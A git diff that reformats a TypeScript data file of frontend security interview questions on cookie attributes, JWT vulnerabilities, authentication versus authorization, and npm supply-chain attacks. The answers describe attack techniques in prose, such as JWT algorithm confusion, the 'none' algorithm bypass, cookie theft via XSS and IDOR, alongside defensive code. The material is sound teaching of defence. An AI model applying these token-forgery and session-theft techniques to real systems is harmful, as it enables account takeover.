 **Attack Scenario:** Without these attributes, session cookies are vulnerable to multiple attacks. Without HttpOnly, an XSS vulnerability allows \`document.cookie\` to read the session token and send it to an attacker's server — enabling session hijacking. Without Secure, cookies are sent over unencrypted HTTP connections, allowing network attackers (on public Wi-Fi, for example) to intercept session tokens via man-in-the-middle attacks. Without SameSite, cookies are sent with every cross-origin request, enabling CSRF attacks where a malicious site triggers authenticated actions on the target site.
@@ -636,7 +696,8 @@ function UnsafeProfile({ html }: { html: string }) {
 **Impact:** Each attribute mitigates a specific attack category. HttpOnly eliminates the most common XSS consequence (session theft) — even if an attacker can execute JavaScript via XSS, they can't access HttpOnly cookies, forcing them to perform actions within the XSS context rather than stealing the session for persistent access. Secure prevents the devastating simplicity of Wi-Fi cookie sniffing, which was famously demonstrated by the Firesheep tool. SameSite eliminates most CSRF attack scenarios by ensuring cookies aren't sent on cross-origin requests that the user didn't explicitly initiate.
 
 **Prevention and Implementation:** For session cookies, always set all three attributes. SameSite has three values: Strict (cookies never sent cross-site — most secure but can break legitimate flows like clicking a link from email), Lax (cookies sent on top-level navigations but not on cross-site POST/AJAX — good balance), and None (cookies always sent cross-site — must be combined with Secure, used for legitimate cross-origin scenarios like embedded widgets). Modern browsers default to SameSite=Lax when no attribute is specified. Additionally, use the Path attribute to limit cookie scope, Max-Age or Expires for session lifetime control, and consider cookie prefixes (__Host- and __Secure-) for additional security guarantees.`,
-        shortAnswer: 'HttpOnly prevents JavaScript access to cookies (stops XSS cookie theft). Secure ensures cookies are only sent over HTTPS (prevents network interception). SameSite controls cross-origin cookie sending: Strict (never), Lax (top-level navigations only), None (always, requires Secure). All three should be set on session cookies.',
+        shortAnswer:
+          "HttpOnly prevents JavaScript access to cookies (stops XSS cookie theft). Secure ensures cookies are only sent over HTTPS (prevents network interception). SameSite controls cross-origin cookie sending: Strict (never), Lax (top-level navigations only), None (always, requires Secure). All three should be set on session cookies.",
         code: `// Server: setting secure session cookie
 // Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
 
@@ -691,32 +752,33 @@ app.use(session({
 const response = await fetch('https://api.example.com/data', {
   credentials: 'include', // sends cookies cross-origin
 });`,
-        language: 'typescript',
-        difficulty: 'Intermediate',
-        type: 'Conceptual',
-        category: 'Security',
-        topicId: 'web-security-attacks',
-        tags: ['cookies', 'HttpOnly', 'Secure', 'SameSite', 'session-security'],
+        language: "typescript",
+        difficulty: "Intermediate",
+        type: "Conceptual",
+        category: "Security",
+        topicId: "web-security-attacks",
+        tags: ["cookies", "HttpOnly", "Secure", "SameSite", "session-security"],
         commonMistakes: [
-          'Not setting HttpOnly on session cookies, allowing XSS to steal sessions',
-          'Using SameSite=None without the Secure flag — browsers will reject the cookie',
-          'Setting Secure cookies in development without HTTPS, then wondering why sessions don\'t persist',
-          'Using SameSite=Strict when Lax would be more appropriate, breaking legitimate cross-site flows'
+          "Not setting HttpOnly on session cookies, allowing XSS to steal sessions",
+          "Using SameSite=None without the Secure flag — browsers will reject the cookie",
+          "Setting Secure cookies in development without HTTPS, then wondering why sessions don't persist",
+          "Using SameSite=Strict when Lax would be more appropriate, breaking legitimate cross-site flows",
         ],
         followUps: [
-          'What are __Host- and __Secure- cookie prefixes?',
-          'How do you handle cookies in a development environment without HTTPS?',
-          'What is the default SameSite value in modern browsers?'
+          "What are __Host- and __Secure- cookie prefixes?",
+          "How do you handle cookies in a development environment without HTTPS?",
+          "What is the default SameSite value in modern browsers?",
         ],
         interviewTips: [
-          'Map each attribute to the specific attack it prevents: HttpOnly→XSS, Secure→MITM, SameSite→CSRF',
-          'Explain the three SameSite values with concrete scenarios',
-          'Mention that modern browsers default to SameSite=Lax as a security improvement'
-        ]
+          "Map each attribute to the specific attack it prevents: HttpOnly→XSS, Secure→MITM, SameSite→CSRF",
+          "Explain the three SameSite values with concrete scenarios",
+          "Mention that modern browsers default to SameSite=Lax as a security improvement",
+        ],
       },
       {
-        id: 'sec-8',
-        question: 'What is JWT security? What are common JWT vulnerabilities and best practices for secure token handling?',
+        id: "sec-8",
+        question:
+          "What is JWT security? What are common JWT vulnerabilities and best practices for secure token handling?",
         answer: `**Definition:** JSON Web Tokens (JWT) are a compact, URL-safe format for securely transmitting claims between parties. A JWT consists of three Base64URL-encoded parts separated by dots: a header (algorithm and type), a payload (claims/data), and a signature (cryptographic verification). JWTs are widely used for authentication (proving who you are) and authorization (proving what you can access) in modern web applications, particularly SPAs that communicate with APIs.
 
 **Attack Scenario:** Common JWT attacks include: (1) Algorithm confusion — the attacker changes the header algorithm from RS256 to HS256 and signs the token with the server's public key (which is publicly available), tricking the server into using it as the HMAC secret. (2) None algorithm — the attacker sets the algorithm to "none" and removes the signature, and poorly configured servers accept it as valid. (3) Token theft — if JWTs are stored in localStorage, XSS can steal them. Unlike HttpOnly cookies, localStorage is fully accessible to JavaScript. (4) Missing expiration — tokens without exp claims are valid forever, so a stolen token grants permanent access.
@@ -726,7 +788,8 @@ const response = await fetch('https://api.example.com/data', {
 **Impact:** JWT vulnerabilities can lead to complete authentication bypass (algorithm confusion/none attacks), permanent unauthorized access (missing expiration), session hijacking (token theft from localStorage), and privilege escalation (modifying unverified claims). Since JWTs are self-contained, a compromised token gives the attacker everything they need — there's no server-side session to invalidate unless you implement a token revocation mechanism.
 
 **Prevention best practices:** Always validate the algorithm server-side — never accept the token's header algorithm blindly. Use asymmetric algorithms (RS256) for distributed systems or HS256 with strong secrets for simple setups. Set short expiration times (15 minutes for access tokens) and use refresh tokens (stored in HttpOnly cookies) to obtain new access tokens. Store access tokens in memory (JavaScript variable) rather than localStorage or sessionStorage to prevent XSS theft. Implement token revocation via a deny list for critical security events (password change, logout). Validate all claims (iss, aud, exp, nbf) on every request. Consider using the BFF (Backend for Frontend) pattern where the backend manages tokens and the frontend uses HttpOnly session cookies.`,
-        shortAnswer: 'JWTs transmit signed claims for authentication/authorization. Common vulnerabilities: algorithm confusion (RS256→HS256), "none" algorithm bypass, XSS theft from localStorage, missing expiration. Best practices: validate algorithm server-side, short expiration, store in memory (not localStorage), use refresh tokens in HttpOnly cookies, validate all claims.',
+        shortAnswer:
+          'JWTs transmit signed claims for authentication/authorization. Common vulnerabilities: algorithm confusion (RS256→HS256), "none" algorithm bypass, XSS theft from localStorage, missing expiration. Best practices: validate algorithm server-side, short expiration, store in memory (not localStorage), use refresh tokens in HttpOnly cookies, validate all claims.',
         code: `// JWT Structure
 // Header: { "alg": "RS256", "typ": "JWT" }
 // Payload: { "sub": "user123", "role": "admin", "exp": 1719849600 }
@@ -797,51 +860,66 @@ async function refreshAccessToken(): Promise<void> {
 //     audience: 'https://api.example.com',
 //   });
 // }`,
-        language: 'typescript',
-        difficulty: 'Advanced',
-        type: 'Conceptual',
-        category: 'Security',
-        topicId: 'web-security-attacks',
-        tags: ['JWT', 'authentication', 'tokens', 'refresh-tokens', 'session-management'],
+        language: "typescript",
+        difficulty: "Advanced",
+        type: "Conceptual",
+        category: "Security",
+        topicId: "web-security-attacks",
+        tags: [
+          "JWT",
+          "authentication",
+          "tokens",
+          "refresh-tokens",
+          "session-management",
+        ],
         commonMistakes: [
-          'Storing JWTs in localStorage — accessible to XSS attacks',
-          'Not setting expiration (exp claim) on tokens',
-          'Accepting the algorithm from the token header without server-side validation',
-          'Not implementing token refresh — using long-lived access tokens instead'
+          "Storing JWTs in localStorage — accessible to XSS attacks",
+          "Not setting expiration (exp claim) on tokens",
+          "Accepting the algorithm from the token header without server-side validation",
+          "Not implementing token refresh — using long-lived access tokens instead",
         ],
         followUps: [
-          'What is the BFF (Backend for Frontend) pattern for token management?',
-          'How do you implement JWT token revocation?',
-          'What is the difference between access tokens and refresh tokens?'
+          "What is the BFF (Backend for Frontend) pattern for token management?",
+          "How do you implement JWT token revocation?",
+          "What is the difference between access tokens and refresh tokens?",
         ],
         interviewTips: [
-          'Explain the three parts of a JWT and their purpose',
-          'Emphasize the storage decision: memory > HttpOnly cookie > localStorage',
-          'Show the refresh token flow as a best practice for short-lived access tokens'
-        ]
-      }
-    ]
+          "Explain the three parts of a JWT and their purpose",
+          "Emphasize the storage decision: memory > HttpOnly cookie > localStorage",
+          "Show the refresh token flow as a best practice for short-lived access tokens",
+        ],
+      },
+    ],
   },
   {
-    id: 'security-headers-auth',
-    title: 'Authentication, Authorization & Dependency Security',
-    description: 'Understanding authentication vs authorization, secure dependency management, and building defense-in-depth security for frontend applications.',
-    category: 'Security',
-    difficulty: 'Advanced',
-    tags: ['authentication', 'authorization', 'dependencies', 'supply-chain', 'security-audit'],
-    overview: 'Beyond protecting against specific attacks, frontend security requires understanding authentication and authorization patterns, securing the software supply chain through dependency management, and implementing defense-in-depth strategies that assume individual security measures may fail.',
-    concepts: [
-      'Authentication verifies identity; authorization verifies permissions',
-      'Defense-in-depth uses multiple overlapping security layers',
-      'Dependency security protects against supply-chain attacks',
-      'Security headers provide browser-level protection',
-      'Regular security audits catch vulnerabilities before attackers do'
+    id: "security-headers-auth",
+    title: "Authentication, Authorization & Dependency Security",
+    description:
+      "Understanding authentication vs authorization, secure dependency management, and building defense-in-depth security for frontend applications.",
+    category: "Security",
+    difficulty: "Advanced",
+    tags: [
+      "authentication",
+      "authorization",
+      "dependencies",
+      "supply-chain",
+      "security-audit",
     ],
-    relatedTopicIds: ['web-security-attacks'],
+    overview:
+      "Beyond protecting against specific attacks, frontend security requires understanding authentication and authorization patterns, securing the software supply chain through dependency management, and implementing defense-in-depth strategies that assume individual security measures may fail.",
+    concepts: [
+      "Authentication verifies identity; authorization verifies permissions",
+      "Defense-in-depth uses multiple overlapping security layers",
+      "Dependency security protects against supply-chain attacks",
+      "Security headers provide browser-level protection",
+      "Regular security audits catch vulnerabilities before attackers do",
+    ],
+    relatedTopicIds: ["web-security-attacks"],
     questions: [
       {
-        id: 'sec-9',
-        question: 'What is the difference between authentication and authorization? How do they work together in frontend applications?',
+        id: "sec-9",
+        question:
+          "What is the difference between authentication and authorization? How do they work together in frontend applications?",
         answer: `**Definition:** Authentication (AuthN) is the process of verifying who a user is — confirming their identity through credentials like username/password, biometrics, or multi-factor authentication. Authorization (AuthZ) is the process of determining what an authenticated user is allowed to do — checking their permissions, roles, or access levels against protected resources and actions.
 
 **Attack Scenario:** Confusing authentication and authorization leads to serious security flaws. A common vulnerability is authorization bypass: a user successfully authenticates (proves they are who they claim to be) and then accesses admin pages or other users' data because the application only checks authentication, not authorization. Example: User A authenticates and directly navigates to \`/api/users/userB/profile\` — if the server only verifies the JWT is valid but doesn't check whether User A has permission to access User B's profile, this is an Insecure Direct Object Reference (IDOR) vulnerability.
@@ -851,7 +929,8 @@ async function refreshAccessToken(): Promise<void> {
 **Impact:** Authentication failures allow unauthorized access to the system entirely — anyone can impersonate any user. Authorization failures are more nuanced: authenticated users access data or perform actions beyond their privilege level. Both are critical, but authorization bugs are more common because they're harder to test and often involve complex business rules.
 
 **Prevention:** Frontend authorization is for UX only — never rely on hiding UI elements as a security measure. All authorization must be enforced on the backend because frontend code can be modified. Use role-based access control (RBAC) or attribute-based access control (ABAC) on the server. Implement the principle of least privilege — users should have only the minimum permissions needed. For routes in React, check permissions before rendering protected components, but always validate on the backend. Log authorization failures as potential security incidents.`,
-        shortAnswer: 'Authentication verifies identity (who you are); authorization verifies permissions (what you can do). Authentication happens first via credentials, then authorization checks roles/permissions for each action. Frontend authorization is UX only — all permission checks must be enforced server-side because client code can be manipulated.',
+        shortAnswer:
+          "Authentication verifies identity (who you are); authorization verifies permissions (what you can do). Authentication happens first via credentials, then authorization checks roles/permissions for each action. Frontend authorization is UX only — all permission checks must be enforced server-side because client code can be manipulated.",
         code: `// Authentication: verify identity
 async function authenticate(email: string, password: string): Promise<AuthResult> {
   const response = await fetch('/api/auth/login', {
@@ -927,32 +1006,39 @@ function ReportCard({ report }: { report: Report }) {
     </div>
   );
 }`,
-        language: 'typescript',
-        difficulty: 'Intermediate',
-        type: 'Conceptual',
-        category: 'Security',
-        topicId: 'security-headers-auth',
-        tags: ['authentication', 'authorization', 'RBAC', 'permissions', 'protected-routes'],
+        language: "typescript",
+        difficulty: "Intermediate",
+        type: "Conceptual",
+        category: "Security",
+        topicId: "security-headers-auth",
+        tags: [
+          "authentication",
+          "authorization",
+          "RBAC",
+          "permissions",
+          "protected-routes",
+        ],
         commonMistakes: [
-          'Relying on frontend authorization (hiding buttons) as a security measure',
-          'Only checking authentication without checking authorization on API endpoints',
-          'Storing user roles in JWT without revalidating — role changes won\'t take effect until token expires',
-          'Using generic permission checks instead of resource-specific authorization'
+          "Relying on frontend authorization (hiding buttons) as a security measure",
+          "Only checking authentication without checking authorization on API endpoints",
+          "Storing user roles in JWT without revalidating — role changes won't take effect until token expires",
+          "Using generic permission checks instead of resource-specific authorization",
         ],
         followUps: [
-          'What is the difference between RBAC and ABAC?',
-          'How do you handle permission changes in real-time with JWTs?',
-          'What is the principle of least privilege?'
+          "What is the difference between RBAC and ABAC?",
+          "How do you handle permission changes in real-time with JWTs?",
+          "What is the principle of least privilege?",
         ],
         interviewTips: [
-          'Use a clear analogy: AuthN is like checking your ID at the door, AuthZ is like checking your ticket for VIP',
-          'Emphasize that frontend authorization is UX, backend authorization is security',
-          'Mention IDOR as a common authorization vulnerability to show practical awareness'
-        ]
+          "Use a clear analogy: AuthN is like checking your ID at the door, AuthZ is like checking your ticket for VIP",
+          "Emphasize that frontend authorization is UX, backend authorization is security",
+          "Mention IDOR as a common authorization vulnerability to show practical awareness",
+        ],
       },
       {
-        id: 'sec-10',
-        question: 'How do you secure frontend dependencies? Explain supply chain attacks and mitigation strategies.',
+        id: "sec-10",
+        question:
+          "How do you secure frontend dependencies? Explain supply chain attacks and mitigation strategies.",
         answer: `**Definition:** Dependency security addresses the risks introduced by third-party packages in your application's supply chain. Modern JavaScript applications typically depend on hundreds or thousands of npm packages, each maintained by different authors. A supply chain attack compromises one of these packages — through account takeover, malicious code injection, or dependency confusion — to execute malicious code in every application that installs the compromised package.
 
 **Attack Scenario:** In a supply chain attack, an attacker gains control of a popular npm package (through compromised maintainer credentials, typosquatting, or social engineering). They publish a new version containing malicious code that executes during installation (via postinstall scripts) or at runtime (stealing environment variables, injecting cryptocurrency miners, or exfiltrating data). Because npm install runs with the developer's full system permissions and CI/CD pipelines often have access to production secrets, the impact can be devastating. Notable real-world examples include the event-stream incident (cryptocurrency theft), ua-parser-js (cryptominer injection), and node-ipc (destructive protest-ware).
@@ -962,7 +1048,8 @@ function ReportCard({ report }: { report: Report }) {
 **Impact:** Supply chain attacks can affect millions of developers and end-users simultaneously. A single compromised package in your dependency tree can steal secrets, inject backdoors, or modify your application's behavior. The impact ranges from data theft and cryptocurrency mining to full system compromise. CI/CD environments are especially vulnerable because they often have access to production deployments, cloud credentials, and signing keys.
 
 **Prevention** requires a multi-layered approach. Use lock files (package-lock.json, yarn.lock) to pin exact dependency versions and prevent automatic updates to compromised versions. Run \`npm audit\` regularly and in CI to detect known vulnerabilities. Use tools like Socket.dev or Snyk to detect suspicious package behavior (network access, filesystem access, obfuscated code). Enable npm's package provenance to verify packages were built from their claimed source repository. Minimize dependencies — evaluate whether you really need a package or if the functionality can be implemented in a few lines. Pin major versions in package.json and review changelogs before updating. Consider using a private registry or proxy (Verdaccio, Artifactory) to control which packages are available to your team. Disable postinstall scripts for untrusted packages with \`--ignore-scripts\`.`,
-        shortAnswer: 'Supply chain attacks compromise npm packages to execute malicious code in all downstream applications. Mitigation: use lock files, run npm audit in CI, use Socket.dev/Snyk for behavioral analysis, minimize dependencies, review updates before installing, disable postinstall scripts for untrusted packages, and consider private registries.',
+        shortAnswer:
+          "Supply chain attacks compromise npm packages to execute malicious code in all downstream applications. Mitigation: use lock files, run npm audit in CI, use Socket.dev/Snyk for behavioral analysis, minimize dependencies, review updates before installing, disable postinstall scripts for untrusted packages, and consider private registries.",
         code: `// 1. Lock files pin exact versions
 // package-lock.json ensures everyone gets identical dependency tree
 // ALWAYS commit lock files to version control
@@ -1024,29 +1111,35 @@ function evaluateDependency(packageName: string): DependencyCheck {
 //   integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
 //   crossorigin="anonymous">
 // </script>`,
-        language: 'typescript',
-        difficulty: 'Advanced',
-        type: 'Scenario',
-        category: 'Security',
-        topicId: 'security-headers-auth',
-        tags: ['supply-chain', 'npm-audit', 'dependency-security', 'npm', 'lock-files'],
+        language: "typescript",
+        difficulty: "Advanced",
+        type: "Scenario",
+        category: "Security",
+        topicId: "security-headers-auth",
+        tags: [
+          "supply-chain",
+          "npm-audit",
+          "dependency-security",
+          "npm",
+          "lock-files",
+        ],
         commonMistakes: [
-          'Not committing lock files to version control, causing inconsistent installs',
-          'Ignoring npm audit warnings because they seem like false positives',
-          'Auto-merging dependabot PRs without reviewing the changes',
-          'Adding packages for trivial functionality (left-pad syndrome)'
+          "Not committing lock files to version control, causing inconsistent installs",
+          "Ignoring npm audit warnings because they seem like false positives",
+          "Auto-merging dependabot PRs without reviewing the changes",
+          "Adding packages for trivial functionality (left-pad syndrome)",
         ],
         followUps: [
-          'What was the event-stream incident and what lessons does it teach?',
-          'How does npm package provenance work?',
-          'What is dependency confusion and how do you prevent it?'
+          "What was the event-stream incident and what lessons does it teach?",
+          "How does npm package provenance work?",
+          "What is dependency confusion and how do you prevent it?",
         ],
         interviewTips: [
-          'Mention real-world incidents (event-stream, ua-parser-js) to show awareness',
-          'Emphasize the layered approach: lock files + audit + behavioral analysis + minimization',
-          'Discuss the tradeoff between using dependencies and the security risk they introduce'
-        ]
-      }
-    ]
-  }
+          "Mention real-world incidents (event-stream, ua-parser-js) to show awareness",
+          "Emphasize the layered approach: lock files + audit + behavioral analysis + minimization",
+          "Discuss the tradeoff between using dependencies and the security risk they introduce",
+        ],
+      },
+    ],
+  },
 ];
